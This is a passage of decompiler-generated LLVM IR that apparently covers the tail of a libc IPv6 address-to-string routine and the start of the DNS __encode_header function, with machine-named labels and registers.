dec_label_pc_8056d2a:                             ; preds = %dec_label_pc_8056d23
  %v1_8056d2d = icmp eq i1 %v10_8056d3b, false
  br i1 %v1_8056d2d, label %dec_label_pc_8056d38, label %dec_label_pc_8056d2f

dec_label_pc_8056d2f:                             ; preds = %dec_label_pc_8056d2a
  store i32 %v0_8056d5071, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056d50

dec_label_pc_8056d38:                             ; preds = %dec_label_pc_8056d2a
  %v0_8056d38 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056d38 = add i32 %v0_8056d38, 1
  store i32 %v1_8056d38, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056d50

dec_label_pc_8056d3b:                             ; preds = %dec_label_pc_8056d23
  br i1 %v10_8056d3b, label %dec_label_pc_8056d50, label %dec_label_pc_8056d40

dec_label_pc_8056d40:                             ; preds = %dec_label_pc_8056d3b
  %v10_8056d40 = icmp eq i32 %v0_8056d5b69, -1
  %v0_8056d49.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056d45 = load i32, i32* @ebp, align 4
  %v7_8056d47 = icmp sgt i32 %v0_8056d49.pre, %v1_8056d45
  %or.cond = or i1 %v10_8056d40, %v7_8056d47
  br i1 %or.cond, label %dec_label_pc_8056d49, label %dec_label_pc_8056d4d

dec_label_pc_8056d49:                             ; preds = %dec_label_pc_8056d40
  store i32 %v0_8056d49.pre, i32* @ebp, align 4
  store i32 %v0_8056d6668, i32* @edi, align 4
  br label %dec_label_pc_8056d4d

dec_label_pc_8056d4d:                             ; preds = %dec_label_pc_8056d40, %dec_label_pc_8056d49
  %v0_8056d4011 = phi i32 [ %v0_8056d6668, %dec_label_pc_8056d49 ], [ %v0_8056d5b69, %dec_label_pc_8056d40 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056d50

dec_label_pc_8056d50:                             ; preds = %dec_label_pc_8056d3b, %dec_label_pc_8056d38, %dec_label_pc_8056d2f, %dec_label_pc_8056d4d
  %v0_8056d4b13 = phi i32 [ %v0_8056d6668, %dec_label_pc_8056d3b ], [ %v0_8056d6668, %dec_label_pc_8056d38 ], [ %v0_8056d5071, %dec_label_pc_8056d2f ], [ -1, %dec_label_pc_8056d4d ]
  %v0_8056d3b8 = phi i32 [ -1, %dec_label_pc_8056d3b ], [ %v0_8056d3b70, %dec_label_pc_8056d38 ], [ %v0_8056d5071, %dec_label_pc_8056d2f ], [ -1, %dec_label_pc_8056d4d ]
  %v0_8056d409 = phi i32 [ %v0_8056d5b69, %dec_label_pc_8056d3b ], [ %v0_8056d5b69, %dec_label_pc_8056d38 ], [ %v0_8056d5b69, %dec_label_pc_8056d2f ], [ %v0_8056d4011, %dec_label_pc_8056d4d ]
  %v1_8056d50 = add nuw nsw i32 %v0_8056d5071, 1
  store i32 %v1_8056d50, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8056d50, 8
  br i1 %exitcond, label %dec_label_pc_8056d56, label %dec_label_pc_8056d23

dec_label_pc_8056d56:                             ; preds = %dec_label_pc_8056d50
  %v10_8056d56 = icmp eq i32 %v0_8056d4b13, -1
  br i1 %v10_8056d56, label %dec_label_pc_8056d68, label %dec_label_pc_8056d5b

dec_label_pc_8056d5b:                             ; preds = %dec_label_pc_8056d56
  %v10_8056d5b = icmp eq i32 %v0_8056d409, -1
  %v0_8056d64.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8056d5b, label %dec_label_pc_8056d64, label %dec_label_pc_8056d60

dec_label_pc_8056d60:                             ; preds = %dec_label_pc_8056d5b
  %v1_8056d60 = load i32, i32* @ebp, align 4
  %v7_8056d62 = icmp sgt i32 %v0_8056d64.pre, %v1_8056d60
  br i1 %v7_8056d62, label %dec_label_pc_8056d64, label %dec_label_pc_8056d68.thread

dec_label_pc_8056d68.thread:                      ; preds = %dec_label_pc_8056d60
  br label %dec_label_pc_8056d6d

dec_label_pc_8056d64:                             ; preds = %dec_label_pc_8056d5b, %dec_label_pc_8056d60
  store i32 %v0_8056d64.pre, i32* @ebp, align 4
  store i32 %v0_8056d4b13, i32* @edi, align 4
  br label %dec_label_pc_8056d68

dec_label_pc_8056d68:                             ; preds = %dec_label_pc_8056d56, %dec_label_pc_8056d64
  %v0_8056d68 = phi i32 [ %v0_8056d409, %dec_label_pc_8056d56 ], [ %v0_8056d4b13, %dec_label_pc_8056d64 ]
  %v10_8056d68 = icmp eq i32 %v0_8056d68, -1
  br i1 %v10_8056d68, label %dec_label_pc_8056d75, label %dec_label_pc_8056d68.dec_label_pc_8056d6d_crit_edge

dec_label_pc_8056d68.dec_label_pc_8056d6d_crit_edge: ; preds = %dec_label_pc_8056d68
  %v0_8056d6d.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8056d6d

dec_label_pc_8056d6d:                             ; preds = %dec_label_pc_8056d68.dec_label_pc_8056d6d_crit_edge, %dec_label_pc_8056d68.thread
  %v0_8056d6d = phi i32 [ %v1_8056d60, %dec_label_pc_8056d68.thread ], [ %v0_8056d6d.pre, %dec_label_pc_8056d68.dec_label_pc_8056d6d_crit_edge ]
  %v0_8056d6849 = phi i32 [ %v0_8056d409, %dec_label_pc_8056d68.thread ], [ %v0_8056d68, %dec_label_pc_8056d68.dec_label_pc_8056d6d_crit_edge ]
  %v1_8056d6d = add i32 %v0_8056d6d, -1
  %v6_8056d6d = sub i32 0, %v0_8056d6d
  %v7_8056d6d = and i32 %v0_8056d6d, %v6_8056d6d
  %v8_8056d6d = icmp slt i32 %v7_8056d6d, 0
  %v9_8056d6d = icmp eq i32 %v1_8056d6d, 0
  %v10_8056d6d = icmp slt i32 %v1_8056d6d, 0
  %v3_8056d70 = icmp eq i1 %v10_8056d6d, %v8_8056d6d
  %v4_8056d70 = icmp eq i1 %v9_8056d6d, false
  %v5_8056d70 = and i1 %v4_8056d70, %v3_8056d70
  br i1 %v5_8056d70, label %dec_label_pc_8056d75, label %dec_label_pc_8056d72

dec_label_pc_8056d72:                             ; preds = %dec_label_pc_8056d6d
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8056d75

dec_label_pc_8056d75:                             ; preds = %dec_label_pc_8056d6d, %dec_label_pc_8056d68, %dec_label_pc_8056d72
  %v0_8056e1518 = phi i32 [ %v0_8056d6849, %dec_label_pc_8056d6d ], [ -1, %dec_label_pc_8056d68 ], [ -1, %dec_label_pc_8056d72 ]
  %v2_8056d75 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8056d75, i32* @ebx, align 4
  %v3_8056df7 = add i32 %v4_8056cd7, 64
  %v12_8056db5 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_8056e1561 = icmp eq i32 %v0_8056e1518, -1
  %v1_8056dbd = icmp eq i1 %v12_8056db5, false
  br label %dec_label_pc_8056d80

dec_label_pc_8056d80:                             ; preds = %dec_label_pc_8056d75, %dec_label_pc_8056e0b
  %v10_8056e1567 = phi i1 [ %v10_8056e1561, %dec_label_pc_8056d75 ], [ %v10_8056e15, %dec_label_pc_8056e0b ]
  %v0_8056d9a66 = phi i32 [ 0, %dec_label_pc_8056d75 ], [ %v1_8056e0b, %dec_label_pc_8056e0b ]
  %v1_8056d9065 = phi i32 [ %v0_8056e1518, %dec_label_pc_8056d75 ], [ %v0_8056e15.pre, %dec_label_pc_8056e0b ]
  %v0_8056d9e64 = phi i32 [ %v2_8056d75, %dec_label_pc_8056d75 ], [ %v0_8056d9419, %dec_label_pc_8056e0b ]
  %stack_var_-120.163 = phi i8* [ null, %dec_label_pc_8056d75 ], [ %stack_var_-120.0, %dec_label_pc_8056e0b ]
  %stack_var_-116.162 = phi i32 [ 32, %dec_label_pc_8056d75 ], [ %stack_var_-116.0, %dec_label_pc_8056e0b ]
  br i1 %v10_8056e1567, label %dec_label_pc_8056d9a, label %dec_label_pc_8056d85

dec_label_pc_8056d85:                             ; preds = %dec_label_pc_8056d80
  %v12_8056d85 = icmp eq i32 %v0_8056d9a66, %v1_8056d9065
  %v5_8056d87 = icmp slt i32 %v0_8056d9a66, %v1_8056d9065
  br i1 %v5_8056d87, label %dec_label_pc_8056d9a, label %dec_label_pc_8056d89

dec_label_pc_8056d89:                             ; preds = %dec_label_pc_8056d85
  %v1_8056d89 = load i32, i32* @ebp, align 4
  %v2_8056d89 = add i32 %v1_8056d89, %v1_8056d9065
  store i32 %v2_8056d89, i32* %eax.global-to-local, align 4
  %v5_8056d8e = icmp slt i32 %v0_8056d9a66, %v2_8056d89
  br i1 %v5_8056d8e, label %dec_label_pc_8056d90, label %dec_label_pc_8056d9a

dec_label_pc_8056d90:                             ; preds = %dec_label_pc_8056d89
  %v1_8056d92 = icmp eq i1 %v12_8056d85, false
  br i1 %v1_8056d92, label %dec_label_pc_8056e0b, label %dec_label_pc_8056d94

dec_label_pc_8056d94:                             ; preds = %dec_label_pc_8056d90
  %v1_8056d94 = inttoptr i32 %v0_8056d9e64 to i8*
  store i8 58, i8* %v1_8056d94, align 1
  %v0_8056d97 = load i32, i32* @ebx, align 4
  %v1_8056d97 = add i32 %v0_8056d97, 1
  store i32 %v1_8056d97, i32* @ebx, align 4
  br label %dec_label_pc_8056e0b

dec_label_pc_8056d9a:                             ; preds = %dec_label_pc_8056d89, %dec_label_pc_8056d85, %dec_label_pc_8056d80
  %v1_8056d9a = icmp eq i32 %v0_8056d9a66, 0
  br i1 %v1_8056d9a, label %dec_label_pc_8056da2.thread, label %dec_label_pc_8056da2

dec_label_pc_8056da2.thread:                      ; preds = %dec_label_pc_8056d9a
  br label %dec_label_pc_8056df6

dec_label_pc_8056da2:                             ; preds = %dec_label_pc_8056d9a
  %v1_8056d9e = inttoptr i32 %v0_8056d9e64 to i8*
  store i8 58, i8* %v1_8056d9e, align 1
  %v0_8056da1 = load i32, i32* @ebx, align 4
  %v1_8056da1 = add i32 %v0_8056da1, 1
  store i32 %v1_8056da1, i32* @ebx, align 4
  %v0_8056da2.pre = load i32, i32* @esi, align 4
  %v9_8056da2 = icmp eq i32 %v0_8056da2.pre, 6
  %v1_8056da5 = icmp eq i1 %v9_8056da2, false
  br i1 %v1_8056da5, label %dec_label_pc_8056df6, label %dec_label_pc_8056da7

dec_label_pc_8056da7:                             ; preds = %dec_label_pc_8056da2
  %v0_8056da7 = load i32, i32* @edi, align 4
  %v1_8056da7 = icmp eq i32 %v0_8056da7, 0
  %v1_8056da9 = icmp eq i1 %v1_8056da7, false
  br i1 %v1_8056da9, label %dec_label_pc_8056df6, label %dec_label_pc_8056dab

dec_label_pc_8056dab:                             ; preds = %dec_label_pc_8056da7
  %v0_8056dab = load i32, i32* @ebp, align 4
  %v9_8056dab = icmp eq i32 %v0_8056dab, 6
  br i1 %v9_8056dab, label %dec_label_pc_8056dbf, label %dec_label_pc_8056db0

dec_label_pc_8056db0:                             ; preds = %dec_label_pc_8056dab
  %v9_8056db0 = icmp eq i32 %v0_8056dab, 5
  %v1_8056db3 = icmp eq i1 %v9_8056db0, false
  br i1 %v1_8056db3, label %dec_label_pc_8056df6, label %dec_label_pc_8056db5

dec_label_pc_8056db5:                             ; preds = %dec_label_pc_8056db0
  br i1 %v1_8056dbd, label %dec_label_pc_8056df6, label %dec_label_pc_8056dbf

dec_label_pc_8056dbf:                             ; preds = %dec_label_pc_8056db5, %dec_label_pc_8056dab
  %v2_8056dc5 = sub i32 %v1_8056da1, %v2_8056d75
  store i32 %v2_8056dc5, i32* @esi, align 4
  %v2_8056dd0 = sub i32 46, %v2_8056dc5
  store i32 %v2_8056dd0, i32* @ecx, align 4
  %v1_8056dd2 = add i32 %arg2, 12
  store i32 %v1_8056dd2, i32* @eax, align 4
  store i32 %v1_8056da1, i32* @edx, align 4
  %v0_8056dd7 = load i8*, i8** %stack_var_-124, align 4
  %v1_8056dd7 = ptrtoint i8* %v0_8056dd7 to i32
  %v3_8056dd7 = ptrtoint i8* %stack_var_-120.163 to i32
  %v5_8056dd7 = call i32 @inet_ntop4(i32 %v1_8056dd7, i32 %v3_8056dd7, i32 %stack_var_-116.162)
  store i32 %v5_8056dd7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8056dde = icmp eq i32 %v5_8056dd7, 0
  br i1 %v1_8056dde, label %dec_label_pc_8056e68, label %dec_label_pc_8056de6

dec_label_pc_8056de6:                             ; preds = %dec_label_pc_8056dbf
  %v0_8056de9 = load i32, i32* @ebx, align 4
  %v5_8056de9 = inttoptr i32 %v0_8056de9 to i8*
  store i8* %v5_8056de9, i8** %stack_var_-124, align 4
  %v3_8056dea = call i32 @strlen(i8* %v5_8056de9)
  store i32 %v3_8056dea, i32* %eax.global-to-local, align 4
  %v0_8056df2 = load i32, i32* @ebx, align 4
  %v3_8056df2 = add i32 %v0_8056df2, %v3_8056dea
  store i32 %v3_8056df2, i32* @ebx, align 4
  %v0_8056e1a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056e1a

dec_label_pc_8056df6:                             ; preds = %dec_label_pc_8056da2.thread, %dec_label_pc_8056db5, %dec_label_pc_8056db0, %dec_label_pc_8056da7, %dec_label_pc_8056da2
  %v1_8056df754 = phi i32 [ 0, %dec_label_pc_8056da2.thread ], [ %v0_8056da2.pre, %dec_label_pc_8056db5 ], [ %v0_8056da2.pre, %dec_label_pc_8056db0 ], [ %v0_8056da2.pre, %dec_label_pc_8056da7 ], [ %v0_8056da2.pre, %dec_label_pc_8056da2 ]
  %v0_8056e0053 = phi i32 [ %v0_8056d9e64, %dec_label_pc_8056da2.thread ], [ %v1_8056da1, %dec_label_pc_8056db5 ], [ %v1_8056da1, %dec_label_pc_8056db0 ], [ %v1_8056da1, %dec_label_pc_8056da7 ], [ %v1_8056da1, %dec_label_pc_8056da2 ]
  %v0_8056df6 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8056df6, i32* %stack_var_-112, align 4
  %v2_8056df7 = mul i32 %v1_8056df754, 4
  %v4_8056df7 = add i32 %v3_8056df7, %v2_8056df7
  %v5_8056df7 = inttoptr i32 %v4_8056df7 to i32*
  %v6_8056df7 = load i32, i32* %v5_8056df7, align 4
  %v5_8056e00 = inttoptr i32 %v0_8056e0053 to i8*
  store i8* %v5_8056e00, i8** %stack_var_-124, align 4
  %v6_8056e01 = call i32 @sprintf(i32 %v0_8056e0053, i32 ptrtoint ([3 x i8]* @global_var_805ab31.574 to i32), i32 %v6_8056df7, i32 %v0_8056df6)
  store i32 %v6_8056e01, i32* %eax.global-to-local, align 4
  %v0_8056e09 = load i32, i32* @ebx, align 4
  %v2_8056e09 = add i32 %v0_8056e09, %v6_8056e01
  store i32 %v2_8056e09, i32* @ebx, align 4
  br label %dec_label_pc_8056e0b

dec_label_pc_8056e0b:                             ; preds = %dec_label_pc_8056d90, %dec_label_pc_8056d94, %dec_label_pc_8056df6
  %stack_var_-116.0 = phi i32 [ %v6_8056df7, %dec_label_pc_8056df6 ], [ %stack_var_-116.162, %dec_label_pc_8056d90 ], [ %stack_var_-116.162, %dec_label_pc_8056d94 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805ab31.574, i32 0, i32 0), %dec_label_pc_8056df6 ], [ %stack_var_-120.163, %dec_label_pc_8056d90 ], [ %stack_var_-120.163, %dec_label_pc_8056d94 ]
  %v0_8056d9419 = phi i32 [ %v2_8056e09, %dec_label_pc_8056df6 ], [ %v0_8056d9e64, %dec_label_pc_8056d90 ], [ %v1_8056d97, %dec_label_pc_8056d94 ]
  %v0_8056e0b = load i32, i32* @esi, align 4
  %v1_8056e0b = add i32 %v0_8056e0b, 1
  %v0_8056e15.pre = load i32, i32* @edi, align 4
  store i32 %v1_8056e0b, i32* @esi, align 4
  %v7_8056e0f = icmp sgt i32 %v1_8056e0b, 7
  %v10_8056e15 = icmp eq i32 %v0_8056e15.pre, -1
  br i1 %v7_8056e0f, label %dec_label_pc_8056e15, label %dec_label_pc_8056d80

dec_label_pc_8056e15:                             ; preds = %dec_label_pc_8056e0b
  br i1 %v10_8056e15, label %dec_label_pc_8056e26, label %dec_label_pc_8056e1a

dec_label_pc_8056e1a:                             ; preds = %dec_label_pc_8056e15, %dec_label_pc_8056de6
  %v0_8056e22 = phi i32 [ %v0_8056d9419, %dec_label_pc_8056e15 ], [ %v3_8056df2, %dec_label_pc_8056de6 ]
  %v0_8056e1a = phi i32 [ %v0_8056e15.pre, %dec_label_pc_8056e15 ], [ %v0_8056e1a.pre, %dec_label_pc_8056de6 ]
  %v1_8056e1a = load i32, i32* @ebp, align 4
  %v2_8056e1a = add i32 %v1_8056e1a, %v0_8056e1a
  store i32 %v2_8056e1a, i32* %eax.global-to-local, align 4
  %v9_8056e1d = icmp eq i32 %v2_8056e1a, 8
  %v1_8056e20 = icmp eq i1 %v9_8056e1d, false
  br i1 %v1_8056e20, label %dec_label_pc_8056e26, label %dec_label_pc_8056e22

dec_label_pc_8056e22:                             ; preds = %dec_label_pc_8056e1a
  %v1_8056e22 = inttoptr i32 %v0_8056e22 to i8*
  store i8 58, i8* %v1_8056e22, align 1
  %v0_8056e25 = load i32, i32* @ebx, align 4
  %v1_8056e25 = add i32 %v0_8056e25, 1
  store i32 %v1_8056e25, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056e26

dec_label_pc_8056e26:                             ; preds = %dec_label_pc_8056e1a, %dec_label_pc_8056e15, %dec_label_pc_8056e22
  %v0_8056e2a = phi i32 [ %v0_8056e22, %dec_label_pc_8056e1a ], [ %v0_8056d9419, %dec_label_pc_8056e15 ], [ %v1_8056e25, %dec_label_pc_8056e22 ]
  store i32 %v2_8056d75, i32* %edx.global-to-local, align 4
  %v1_8056e2a = add i32 %v0_8056e2a, 1
  store i32 %v1_8056e2a, i32* %eax.global-to-local, align 4
  %v1_8056e2d = inttoptr i32 %v0_8056e2a to i8*
  store i8 0, i8* %v1_8056e2d, align 1
  %v0_8056e30 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056e30 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056e30 = sub i32 %v0_8056e30, %v1_8056e30
  store i32 %v2_8056e30, i32* @eax, align 4
  %tmp78 = icmp ugt i32 %v2_8056e30, %arg4
  br i1 %tmp78, label %dec_label_pc_8056e38, label %dec_label_pc_8056e45

dec_label_pc_8056e38:                             ; preds = %dec_label_pc_8056e26
  %v0_8056e38 = load i8*, i8** %stack_var_-124, align 4
  %v1_8056e38 = ptrtoint i8* %v0_8056e38 to i32
  %v2_8056e38 = call i32 @__errno_location(i32 %v1_8056e38)
  store i32 %v2_8056e38, i32* %eax.global-to-local, align 4
  %v1_8056e3d = inttoptr i32 %v2_8056e38 to i32*
  store i32 28, i32* %v1_8056e3d, align 4
  br label %dec_label_pc_8056e66

dec_label_pc_8056e45:                             ; preds = %dec_label_pc_8056e26
  %v0_8056e45 = load i32, i32* @edi, align 4
  store i32 %v0_8056e45, i32* %stack_var_-112, align 4
  %tmp45 = bitcast i8** %stack_var_12 to i32*
  %v3_8056e482 = load i32, i32* %tmp45, align 4
  %tmp46 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_8056e482, i32* %tmp46, align 4
  %v0_8056e4f.cast = inttoptr i32 %v3_8056e482 to i8*
  %v5_8056e4f = call i32 @strcpy(i8* %v0_8056e4f.cast, i32 %v2_8056d75)
  store i32 %v5_8056e4f, i32* %eax.global-to-local, align 4
  store i32 %v5_8056e4f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056e68

dec_label_pc_8056e5b:                             ; preds = %dec_label_pc_8056cb4
  %v1_8056e5b = call i32 @__errno_location(i32 %v0_8056ca7)
  store i32 %v1_8056e5b, i32* %eax.global-to-local, align 4
  %v1_8056e60 = inttoptr i32 %v1_8056e5b to i32*
  store i32 97, i32* %v1_8056e60, align 4
  br label %dec_label_pc_8056e66

dec_label_pc_8056e66:                             ; preds = %dec_label_pc_8056e38, %dec_label_pc_8056e5b
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056e68

dec_label_pc_8056e68:                             ; preds = %dec_label_pc_8056dbf, %dec_label_pc_8056e45, %dec_label_pc_8056cbf, %dec_label_pc_8056e66
  %v0_8056e6b = phi i32 [ 0, %dec_label_pc_8056dbf ], [ %v5_8056e4f, %dec_label_pc_8056e45 ], [ %v3_8056ccb, %dec_label_pc_8056cbf ], [ 0, %dec_label_pc_8056e66 ]
  store i32 %v0_8056e6b, i32* %eax.global-to-local, align 4
  store i32 %v0_8056ca7, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8056e6b

; uselistorder directives
  uselistorder i32 %v0_8056e6b, { 1, 0 }
  uselistorder i32 %v0_8056e2a, { 1, 0 }
  uselistorder i32 %v1_8056e0b, { 1, 0, 2 }
  uselistorder i32 %v0_8056e0053, { 1, 0 }
  uselistorder i32 %v0_8056da2.pre, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8056da1, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %stack_var_-116.162, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.163, { 2, 1, 0 }
  uselistorder i32 %v0_8056d9e64, { 2, 3, 1, 0 }
  uselistorder i32 %v1_8056d9065, { 2, 0, 1 }
  uselistorder i32 %v0_8056d9a66, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8056d75, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8056d6d, { 1, 0 }
  uselistorder i32 %v0_8056d6d, { 1, 2, 0 }
  uselistorder i32 %v1_8056d50, { 0, 2, 1 }
  uselistorder i32 %v0_8056d409, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8056d4b13, { 0, 2, 1, 3 }
  uselistorder i1 %v10_8056d3b, { 1, 0 }
  uselistorder i32 %v0_8056d6668, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8056d5b69, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8056d5071, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_8056d0b72, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8056ca7, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 5, 6, 2, 4, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 97, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 3, 0, 2, 1 }
  uselistorder [3 x i8]* @global_var_805ab31.574, { 1, 0 }
  uselistorder i8 58, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 65535, { 1, 0, 3, 4, 2 }
  uselistorder i32 64, { 7, 3, 0, 6, 8, 5, 2, 4, 1 }
  uselistorder i32* @esp, { 0, 1, 74, 75, 76, 77, 78, 79, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 15, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 11, 279, 280, 281, 12, 282, 9, 283, 284, 285, 286, 287, 288, 13, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 10, 302, 303, 304, 305, 306, 307, 14, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 179, 2, 3, 336, 4, 5, 6, 16, 180, 181, 182, 183, 17, 184, 185, 186, 187, 188, 19, 189, 190, 191, 21, 192, 22, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 20, 205, 23, 206, 207, 208, 24, 209, 210, 211, 212, 213, 214, 215, 216, 18, 217, 110, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 93, 8, 90, 91, 92, 94, 95, 96, 97, 98, 25, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 111, 112, 113, 114, 115, 7, 116, 117, 118, 119, 123, 120, 121, 122, 124, 125, 127, 126, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 140, 139, 141, 142, 143, 144, 145, 146, 26, 147, 148, 149, 150, 27, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 28, 163, 164, 165, 166, 29, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 30, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 31, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 32, 68, 69, 70, 71, 72, 73, 257, 329, 330, 331, 332, 333, 334, 335 }
  uselistorder i32 15, { 1, 4, 10, 9, 2, 8, 3, 5, 6, 7, 0 }
  uselistorder i32 60, { 5, 6, 3, 7, 8, 4, 1, 2, 0 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 8, 9, 10, 5, 17, 16, 15, 18, 6, 1, 2, 3, 4, 7, 11, 12, 13, 14 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8056e68, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8056e66, { 1, 0 }
  uselistorder label %dec_label_pc_8056e26, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056e0b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056df6, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8056d80, { 1, 0 }
  uselistorder label %dec_label_pc_8056d75, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056d68, { 1, 0 }
  uselistorder label %dec_label_pc_8056d64, { 1, 0 }
  uselistorder label %dec_label_pc_8056d50, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8056d4d, { 1, 0 }
  uselistorder label %dec_label_pc_8056d23, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i8* @__decompiler_undefined_function_2()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8056e75 = load i32, i32* @ebx, align 4
  store i32 %v0_8056e75, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* %ebx.global-to-local, align 4
  %v4_8056e7d = ptrtoint i8* %tmp8 to i32
  store i32 %v4_8056e7d, i32* %esi.global-to-local, align 4
  %v7_8056e86 = icmp sgt i32 %tmp, 11
  br i1 %v7_8056e86, label %dec_label_pc_8056e8c, label %dec_label_pc_8056f22

dec_label_pc_8056e8c:                             ; preds = %entry
  %v1_8056e8c = add i32 %tmp9, 1
  %v2_8056e8c = inttoptr i32 %v1_8056e8c to i8*
  %v3_8056e8c = load i8, i8* %v2_8056e8c, align 1
  store i8 %v3_8056e8c, i8* %tmp8, align 1
  %v0_8056e92 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056e92 = inttoptr i32 %v0_8056e92 to i32*
  %v2_8056e92 = load i32, i32* %v1_8056e92, align 4
  %v1_8056e94 = trunc i32 %v2_8056e92 to i8
  %v2_8056e94 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056e94 = add i32 %v2_8056e94, 1
  %v4_8056e94 = inttoptr i32 %v3_8056e94 to i8*
  store i8 %v1_8056e94, i8* %v4_8056e94, align 1
  %v0_8056eba = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056eba = add i32 %v0_8056eba, 8
  %v2_8056eba = inttoptr i32 %v1_8056eba to i32*
  %v3_8056eba = load i32, i32* %v2_8056eba, align 4
  %v1_8056ebd = mul i32 %v3_8056eba, 8
  %v2_8056ec3 = or i32 %v1_8056ebd, 4
  %v1_8056ec5 = add i32 %v0_8056eba, 20
  %v2_8056ec5 = inttoptr i32 %v1_8056ec5 to i32*
  %v3_8056ec5 = load i32, i32* %v2_8056ec5, align 4
  %v4_8056ec5 = icmp eq i32 %v3_8056ec5, 0
  %v1_8056ec9 = icmp eq i1 %v4_8056ec5, false
  %v2_8056ec9 = zext i1 %v1_8056ec9 to i32
  %v2_8056ecc = or i32 %v2_8056ec9, %v2_8056ec3
  %v2_8056ece = or i32 %v2_8056ecc, -126
  %v5_8056ece = trunc i32 %v2_8056ece to i8
  store i32 %v2_8056ece, i32* @ecx, align 4
  %v2_8056ed0 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056ed0 = add i32 %v2_8056ed0, 2
  %v4_8056ed0 = inttoptr i32 %v3_8056ed0 to i8*
  store i8 %v5_8056ece, i8* %v4_8056ed0, align 1
  %v0_8056ed3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056ed9 = add i32 %v0_8056ed3, 28
  %v2_8056ed9 = inttoptr i32 %v1_8056ed9 to i8*
  %v3_8056ed9 = load i8, i8* %v2_8056ed9, align 1
  %tmp13 = urem i8 %v3_8056ed9, 16
  %v2_8056ee4 = or i8 %tmp13, -128
  %v2_8056ee6 = load i32, i32* %esi.global-to-local, align 4
